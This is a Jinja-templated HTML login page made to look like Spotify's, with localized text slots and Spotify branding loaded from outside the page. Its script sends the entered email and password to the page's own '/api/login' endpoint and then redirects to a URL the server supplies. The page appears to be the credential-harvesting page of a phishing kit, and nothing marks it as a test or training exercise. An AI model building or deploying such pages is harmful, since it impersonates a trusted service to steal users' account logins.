<!DOCTYPE html>
<html lang="{{ lang }}">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ get_text(lang, 'login_title') }} - Spotify</title>
    <link rel="icon" href="https://open.spotifycdn.com/cdn/images/favicon.0f31d2ea.ico">
    <style>
        *{box-sizing:border-box;margin:0;padding:0;font-family:Circular,Spotify Circular,Helvetica,Arial,sans-serif}
        body{background-color:#121212;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
        .login-container{background-color:#000;width:100%;max-width:450px;padding:40px 50px;border-radius:8px;box-shadow:0 4px 60px rgba(0,0,0,0.5)}
        .logo-container{text-align:center;margin-bottom:30px}
        .logo-container img{width:180px;height:auto}
        .lang-indicator{text-align:center;font-size:12px;color:#6c6c8a;margin-bottom:10px}
        h1{text-align:center;font-size:2rem;font-weight:700;margin-bottom:30px}
        .form-group{margin-bottom:20px}
        label{display:block;font-size:.875rem;font-weight:700;margin-bottom:8px}
        input{width:100%;padding:14px;background:#121212;border:1px solid #727272;border-radius:4px;color:#fff;font-size:1rem;transition:border-color .2s}
        input:focus{outline:none;border-color:#fff}
        .submit-btn{width:100%;padding:14px;background-color:#1db954;color:#000;border:none;border-radius:500px;font-size:1rem;font-weight:700;cursor:pointer;margin-top:10px;transition:transform .1s,background-color .2s}
        .submit-btn:hover{background-color:#1ed760;transform:scale(1.02)}
        .error-msg{color:#e91429;font-size:.8rem;margin-top:5px;display:none}
    </style>
</head>
<body>
    <div class="login-container">
        <div class="lang-indicator">🌍 {{ get_text(lang, 'name') }}</div>
        <div class="logo-container">
            <img src="https://storage.googleapis.com/pr-newsroom-wp/1/2018/11/Spotify_Logo_RGB_White.png" alt="Spotify">
        </div>
        <h1>{{ get_text(lang, 'login_title') }}</h1>
        <form id="loginForm">
            <div class="form-group">
                <label>{{ get_text(lang, 'login_email') }}</label>
                <input type="text" id="email" required placeholder="{{ get_text(lang, 'login_email') }}">
                <div class="error-msg" id="errorMsg">{{ get_text(lang, 'login_error') }}</div>
            </div>
            <div class="form-group">
                <label>{{ get_text(lang, 'login_password') }}</label>
                <input type="password" id="password" required placeholder="{{ get_text(lang, 'login_password') }}">
            </div>
            <button type="submit" class="submit-btn">{{ get_text(lang, 'login_button') }}</button>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const errorMsg = document.getElementById('errorMsg');
            try {
                const res = await fetch('/api/login', {
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({email,password})
                });
                const data = await res.json();
                if(data.status === 'success') {
                    window.location.href = data.next;
                } else {
                    errorMsg.style.display = 'block';
                }
            } catch(err) {
                errorMsg.style.display = 'block';
            }
        });
    </script>
</body>
</html>
